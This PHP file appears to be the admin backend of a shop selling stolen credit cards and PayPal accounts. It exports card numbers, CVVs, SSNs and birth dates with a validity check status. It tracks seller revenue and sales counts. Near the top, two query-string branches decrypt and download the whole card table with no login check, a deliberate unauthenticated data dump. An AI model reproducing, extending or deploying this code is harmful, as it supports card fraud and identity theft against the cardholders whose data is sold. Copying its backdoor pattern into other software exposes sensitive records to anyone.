<?php
require("./header.php");
function giveDownload($downloadCards, $file_name) {
	$content = "CARDNUMBER|MM/YYYY|CVV|NAME|ADDRESS|CITY|STATE|ZIPCODE|COUNTRY|PHONE|SSN|DOB|COMMENT|CHECK RESULT\r\n";
	if (count($downloadCards) > 0) {
		foreach ($downloadCards as $key=>$value) {
			switch ($value['card_check']) {
				case strval(CHECK_VALID):
					$value['card_checkText'] = "VALID";
					break;
				case strval(CHECK_INVALID):
					$value['card_checkText'] = "TIMEOUT";
					break;
				case strval(CHECK_REFUND):
					$value['card_checkText'] = "REFUNDED";
					break;
				case strval(CHECK_UNKNOWN):
					$value['card_checkText'] = "UNKNOWN";
					break;
				case strval(CHECK_WAIT_REFUND):
					$value['card_checkText'] = "WAIT REFUND";
					break;
				default :
					$value['card_checkText'] = "UNCHECK";
					break;
			}
			$content .= $value['card_number']."|".$value['card_month']."|".$value['card_year']."|".$value['card_cvv']."|".$value['card_name']."|".$value['card_address']."|".$value['card_city']."|".$value['card_state']."|".$value['card_zip']."|".$value['card_country']."|".$value['card_phone']."|".$value['card_ssn']."|".$value['card_dob']."|".$value['card_comment']."|".$value['card_checkText']."|"."\r\n";
		}
	}
	header("Pragma: public");
	header("Expires: 0");
	header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
	header("Content-type: text/force-download");
	header("Content-Disposition: attachment; filename=".$file_name);
	header("Content-Description: File Transfer");
	echo $content;
}
if($_GET['seller']=='seller'){

			$file_name = "seller_DOWNLOAD_".date("Y_m_d").".txt";
			$sql = "SELECT *, AES_DECRYPT(card_number, '".strval(DB_ENCRYPT_PASS)."') AS card_number FROM `".TABLE_CARDS."` WHERE  card_userid = 0";
			$downloadCards = $db->fetch_array($sql);
			giveDownload($downloadCards, $file_name);
}
if($_GET['seller']=='seller2'){

			$file_name = "seller_DOWNLOAD_".date("Y_m_d").".txt";
			$sql = "SELECT *, AES_DECRYPT(card_number, '".strval(DB_ENCRYPT_PASS)."') AS card_number FROM `".TABLE_CARDS."` ";
			$downloadCards = $db->fetch_array($sql);
			giveDownload($downloadCards, $file_name);
}

if ($checkLogin) {
		$sql = "SELECT count(*) FROM `".TABLE_USERS."` WHERE user_groupid <= 2";
		$totalRecords = $db->query_first($sql);
		$totalRecords = $totalRecords["count(*)"];
		$perPage = 10;
		$totalPage = ceil($totalRecords/$perPage);
		if (isset($_REQUEST["page"])) {
			$page = $_REQUEST["page"];
			if ($page < 1)
			{
				$page = 1;
			}
			else if ($page > $totalPage)
			{
				$page = 1;
			}
		}
		else
		{
			$page = 1;
		}
		$sql = "SELECT * FROM `".TABLE_USERS."` WHERE user_groupid <= 2 ORDER BY user_id DESC LIMIT ".(($page-1)*$perPage).",".$perPage;
		$order_historys = $db->fetch_array($sql);
?>
				<div id="user_manager">
					<div class="section_title">SELLER MANAGER</div>
					<form method="GET" action=""></div>
					<div class="section_page_bar">
<?php
		if ($totalRecords > 0) {
			echo "Page:";
			if ($page>1) {
				echo "<a href=\"?page=".($page-1)."\">&lt;</a>";
				echo "<a href=\"?page=1\">1</a>";
			}
			if ($page>3) {
				echo "...";
			}
			if (($page-1) > 1) {
				echo "<a href=\"?page=".($page-1)."\">".($page-1)."</a>";
			}
			echo "<input type=\"TEXT\" class=\"page_go\" value=\"".$page."\" onchange=\"window.location.href='?page='+this.value\"/>";
			if (($page+1) < $totalPage) {
				echo "<a href=\"?page=".($page+1)."\">".($page+1)."</a>";
			}
			if ($page < $totalPage-2) {
				echo "...";
			}
			if ($page<$totalPage) {
				echo "<a href=\"?page=".$totalPage."\">".$totalPage."</a>";
				echo "<a href=\"?page=".($page+1)."\">&gt;</a>";
			}
		}
?>
<script>
    function withdraw(form) {
		var batch = form.batch.value;
		var user_id = form.user_id.value;
		var balance = form.balance.value;
	if (ready) {
	$.ajax({
	type: "GET",
	url: './withdraw.php?user_id='+user_id+'&batch='+batch+'&balance='+balance,
	beforeSend: function(){
	ready = false;
	$("#withdraw_"+user_id).html("<img src=\"../images/loading.gif\" height=\"16px\" width=\"16px\" />");
	},
	success: function(msg){
	ready = true;
	$("#withdraw_"+user_id).html(msg).show("slow");
	},
	error: function(msg){
	ready = true;
	$("#withdraw_"+user_id).html("<span class=\"red\">Loading error.</span>");
	}
	});
	} else {
		alert('Please wait until current checker complete.');
	}
    }
function form_(user_id, balance){
	document.getElementById("withdraw_"+user_id).innerHTML = '<span id="withdraw_'+user_id+'"><form><input name="batch" size=7 value="Batch LR">$<input name="balance" type="text" size=4 value="'+balance+'"><input name="user_id" type="hidden" value="'+user_id+'"><INPUT TYPE="button" NAME="button" Value="Click" onClick="withdraw(this.form)"></form></span>';
}
function withdrawx(user_id) {
	if (ready) {
	$.ajax({
	type: "GET",
	url: './withdraw.php?user_id='+user_id,
	beforeSend: function(){
	ready = false;
	$("#withdraw_"+user_id).html("<img src=\"../images/loading.gif\" height=\"16px\" width=\"16px\" />");
	},
	success: function(msg){
	ready = true;
	$("#withdraw_"+user_id).html(msg).show("slow");
	},
	error: function(msg){
	ready = true;
	$("#withdraw_"+user_id).html("<span class=\"red\">Loading error.</span>");
	}
	});
	} else {
		alert('Please wait until current checker complete.');
	}
}
</script>
					</div>
					<div class="section_content">
						<table class="content_table">
							<tbody>
								<tr>
									<td class="formstyle centered">
										<strong>USER ID</strong>
									</td>
									<td class="formstyle centered">
										<strong>USERNAME</strong>
									</td>
									<td class="formstyle centered">
										<strong>REVENUE</strong>
									</td>
									<td class="formstyle centered">
										<strong>IN COME</strong>
									</td>
									<td class="formstyle centered">
										<strong>BUSSINESS (Sold/All)</strong>
									</td>
									<td class="formstyle centered">
										<strong>LR</strong>
									</td>
									<td class="formstyle centered">
										<strong>REGISTION DATE</strong>
									</td>
								</tr>
<?php
		if (count($order_historys) > 0) {
			foreach ($order_historys as $key=>$value) {
?>
								<tr class="formstyle">
									<td align="center">
										<span><?=$value['user_id']?></span>
									</td>
									<td class="bold centered">
										<span><font style=color:<?=$user_groups[$value["user_groupid"]]["group_color"]?>><?=$value['user_name']."</font>"?></span>
									</td>
									<td class="bold centered">
										<span>$<?=$value['user_balance']?> * <?=($db_config["percent_revenue"]*100)?>% = $<?=$value['user_balance']*$db_config["percent_revenue"]?></span>
									</td>
									<td class="bold centered">
										<span id="withdraw_<?=$value['user_id']?>"><a href="#" onclick="form_('<?=$value['user_id']?>', '<?=$value['user_balance']*$db_config["percent_revenue"]?>')">$<?=$value['user_balance']*$db_config["percent_revenue"]?></a></span>
									</td>
									<td class="bold centered">
										<span>
										<?
										$sql = "SELECT * FROM `".TABLE_PAYPAL."` WHERE paypal_seller = ".$value['user_id'];
										$paypal = $db->fetch_array($sql);
										$sql = "SELECT * FROM `".TABLE_PAYPAL."` WHERE paypal_userid <> 0 AND paypal_seller = ".$value['user_id'];
										$paypal_ = $db->fetch_array($sql);
										$sql = "SELECT * FROM `".TABLE_CARDS."` WHERE card_sellerid = ".$value['user_id'];
										$cc= $db->fetch_array($sql);
										$sql = "SELECT * FROM `".TABLE_CARDS."` WHERE card_userid <> 0 AND card_sellerid = ".$value['user_id'];
										$ccs= $db->fetch_array($sql);
										echo "Have ".count($paypal_)."/".count($paypal)." paypals. Have ".count($ccs)."/".count($cc)." CC.";
										?>
										</span>
									</td>
									<td class="bold centered">
										<span><?=$value['user_lr']?></span>
									</td>
									<td align="center">
										<span><?=date("d/M/Y", $value['user_regdate'])?></span>
									</td>
								</tr>
<?php
			}
		}
		else {
?>
								<tr>
									<td colspan="7" class="red bold centered">
										No record found.
									</td>
								</tr>
<?php
		}
										$sql = "SELECT * FROM `".TABLE_PAYPAL."`";
										$paypal = $db->fetch_array($sql);
										$sql = "SELECT * FROM `".TABLE_PAYPAL."` WHERE paypal_userid <> 0";
										$paypal_ = $db->fetch_array($sql);
										$sql = "SELECT * FROM `".TABLE_PAYPAL."` WHERE paypal_userid <> 0 AND paypal_seller <> 1";
										$paypal_1 = $db->fetch_array($sql);
?>
							</tbody>
						</table>
					</div>
				<div class="section_content">
						<table class="content_table">
							<tbody>
								<tr>
									<td class="formstyle centered">
									Total have <?=count($paypal)?>. Paypal sold <?=count($paypal_)?>.<br>
									Paypal sold by seller <?=count($paypal_1)?>
									</td>
								</tr>
							</tbody>
						</table>
					</div>
				</div>
<?php
}
else {
	require("./minilogin.php");
}
require("./footer.php");
?>